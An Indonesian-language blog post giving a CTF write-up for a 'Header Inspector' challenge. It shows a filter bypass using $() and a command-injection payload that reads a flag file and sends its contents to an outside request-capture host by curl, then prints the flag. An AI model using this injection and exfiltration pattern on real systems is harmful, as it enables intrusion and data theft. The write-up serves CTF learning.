---
author: cacadosman
date: 2018-07-31 10:12:31+00:00
draft: false
title: Writeup SlashRoot CTF - Header Inspector 200
type: post
url: /writeup-slashroot-ctf-header-inspector-200/
comments: true
categories:
- CTF
- Cyber Security
- Tutorial
---

Pada soal, diberikan sebuah url web

[http://103.200.7.156:7080/](http://103.200.7.156:7080/)

Saat kita buka url tsb, ternyata kita dapat mengecek header dari suatu url, misal google

![](/wp-content/2018/07/headins1.png)


Pastinya Remote Code Execution, karena biasanya soal tipe seperti ini menggunakan curl. Sayangnya filter lumayan kerad, (; && | ternyata dibanned :”).

Oke, untungnya $() tidak dibanned.

Kita akan membypassnya menggunakan command curl yang dibungkus dengan $() dan mengoper responsenya  ke HTTP Request Inspector

[http://reqbin.cacadosman.web.id/v0b9bnv0?inspect](http://reqbin.cacadosman.web.id/v0b9bnv0?inspect)

Kita eksekusi dengan memasukkan payload berikut


```bash
$(curl --data "flag=$(cat /home/node/flag.txt)" http://reqbin.cacadosman.web.id/v0b9bnv0)
```


BIMSALABIM AVADA KADAVRA

![](/wp-content/2018/07/headins2.png)


**SlashRootCTF{b3c0me_a_cvvvrL_n1nj4!}**
